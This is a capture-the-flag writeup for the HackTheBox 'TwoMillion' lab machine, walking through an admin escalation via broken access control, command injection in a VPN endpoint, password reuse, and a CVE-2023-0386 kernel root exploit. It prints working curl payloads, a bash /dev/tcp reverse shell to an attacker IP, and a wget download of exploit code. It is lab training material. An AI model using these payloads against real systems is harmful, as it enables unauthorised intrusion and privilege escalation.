# HTB TwoMillion — Full Writeup

## Box Info

| Field | Value |
|---|---|
| Platform | HackTheBox |
| OS | Linux (Ubuntu) |
| Difficulty | Easy (feels Medium) |
| Stack | PHP / Nginx / MySQL / OverlayFS |
| Kernel | 5.15.70-051570-generic |

## Attack Flow

Nmap → Discover 2million.htb → Deobfuscate JS to find invite API → Generate invite code (base64) → Register account → Enumerate API endpoints → PUT request to escalate to admin (broken access control) → Command injection in admin VPN generate endpoint → Shell as www-data → .env file has DB creds → Password reuse SSH as admin → CVE-2023-0386 OverlayFS kernel exploit → root

## Phase 1: Enumeration

Nmap found port 22 (SSH) and port 80 (HTTP/Nginx). HTTP redirects to `2million.htb` — add it to `/etc/hosts`.

The site is a simulation of the old HackTheBox platform. The `/invite` page has a form that requires an invite code to register.

## Phase 2: Getting the Invite Code

### JavaScript Deobfuscation

The invite page loads an obfuscated JavaScript file. It's eval-packed — use de4js (https://lelinhtinh.github.io/de4js/) to deobfuscate it.

The deobfuscated JS reveals the API endpoint:

```
POST /api/v1/invite/how/to/generate
```

Hit it:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate
```

The response tells you to POST to `/api/v1/invite/generate`. The generated code comes back base64 encoded:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/generate
# decode the code
echo "BASE64_CODE_HERE" | base64 -d
```

Use the decoded invite code to register an account on the site.

## Phase 3: API Enumeration and Admin Escalation

### Listing All API Endpoints

After logging in, enumerate the API:

```bash
curl -s http://2million.htb/api/v1 --cookie "PHPSESSID=your-cookie"
```

This returns all endpoints including admin ones:

- `GET /api/v1/admin/auth` — Check if admin
- `PUT /api/v1/admin/settings/update` — Update user settings
- `POST /api/v1/admin/vpn/generate` — Generate VPN for specific user

### Broken Access Control — Escalate to Admin

The settings update endpoint doesn't properly verify authorization. Any authenticated user can make themselves admin:

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
  --cookie "PHPSESSID=your-cookie" \
  -H "Content-Type: application/json" \
  -d '{"email":"your-email","is_admin":1}'
```

Important: must use `Content-Type: application/json` — it won't work with form-urlencoded. The API will tell you what parameters it expects if you send an incomplete request.

Verify admin access:

```bash
curl -s http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=your-cookie"
```

## Phase 4: Command Injection → RCE

### VPN Generate Endpoint

The admin VPN generate endpoint passes the `username` parameter directly into a system command (like `exec()` or `system()`) without sanitization.

```bash
# Test with id command
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=your-cookie" \
  -H "Content-Type: application/json" \
  -d '{"username":"test;id;"}'
```

The double semicolons are needed — `test;id;` — the first `;` terminates the VPN command, `id` runs, and the trailing `;` closes cleanly.

### Reverse Shell

Set up listener:

```bash
nc -lvnp 4444
```

Inject reverse shell:

```json
{"username":"test;bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1';"}
```

Lands as `www-data`.

### What Didn't Work for Reverse Shell

- `$(command)` substitution didn't trigger
- Spaces in payloads can be problematic — using `${IFS}` or tabs as substitutes
- Base64 encoding the entire payload was unnecessary
- The `-c` flag on bash was the key to getting the reverse shell to work

## Phase 5: Lateral Movement — Password Reuse

### .env File in Web Root

The application reads database credentials from a `.env` file:

```bash
cat /var/www/html/.env
```

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

### Rabbit Hole: MySQL Database

Connected to MySQL and found bcrypt hashed passwords in the users table. Spent time trying to crack them — unnecessary. The DB password itself is reused for SSH.

### SSH as admin

```bash
ssh admin@2million.htb
# Password: SuperDuperPass123
```

User flag in `/home/admin/user.txt`.

## Phase 6: Privilege Escalation — CVE-2023-0386 (OverlayFS)

### Enumeration

Check kernel version:

```bash
uname -r
# 5.15.70-051570-generic
```

This kernel is vulnerable to CVE-2023-0386 — an OverlayFS vulnerability that allows unprivileged users to set SUID on files by exploiting how OverlayFS handles file capabilities with FUSE.

There's also a hint in `/var/mail/admin` mentioning the kernel vulnerability.

### Exploitation

Transfer the CVE-2023-0386 exploit to the target:

```bash
# On Kali — download and serve
python3 -m http.server 8080

# On target
cd /tmp
wget http://YOUR_IP:8080/CVE-2023-0386-main.zip
unzip CVE-2023-0386-main.zip
cd CVE-2023-0386-main
```

The target needs `libfuse-dev` for compilation. If not installed:

```bash
# On Kali
sudo apt install libfuse-dev
# Compile on Kali and transfer the binaries instead
make all
```

The exploit requires two terminals:

Terminal 1:
```bash
cd /tmp/CVE-2023-0386-main
./fuse ./ovlcap/lower ./gc
```

Terminal 2 (new shell/SSH session):
```bash
cd /tmp/CVE-2023-0386-main
./exp
```

Root shell. Flag in `/root/root.txt`.

## Methodology Notes

### API Enumeration Checklist

- Always check `/api` and `/api/v1` for route listings
- Send requests with wrong Content-Type or missing params — APIs often return helpful error messages telling you what they expect
- Look for admin endpoints accessible to regular users (broken access control / IDOR)
- PUT and POST endpoints that modify user settings are prime targets for privilege escalation

### OS Command Injection

- When you suspect a parameter is being passed to a system command, try injection operators: `;`, `|`, `||`, `&&`, `$()`, backticks
- Double semicolons (`test;command;`) can work when single ones don't
- Reverse shells with spaces can be tricky — try the `bash -c` wrapper
- If `$()` substitution doesn't work, try `;` separators instead
- Always test with simple commands first (`id`, `whoami`) before going for reverse shells

### Credential Hunting

- Always check `.env` files in web application roots — they often contain DB credentials
- Password reuse is extremely common — always try found passwords for SSH/other services before trying to crack hashes
- Don't go straight to cracking database hashes — try the DB password itself for lateral movement first

### OverlayFS Exploits

- CVE-2023-0386 affects Linux kernels before 6.2
- Check kernel version with `uname -r`
- The exploit needs two terminals running simultaneously (fuse + exp)
- Compile on your attack box if the target lacks build tools
- Check `/var/mail/` for hints — admins sometimes leave notes about known issues

### Lessons Learned

- The VPN download page on the box is part of the simulation — you don't actually connect to it
- API route listings are goldmines — always check for them
- Content-Type matters — JSON endpoints reject form-urlencoded data
- Don't rabbit-hole on hash cracking when simpler paths (password reuse) exist
- Kernel exploits often need multiple shells/sessions running in parallel
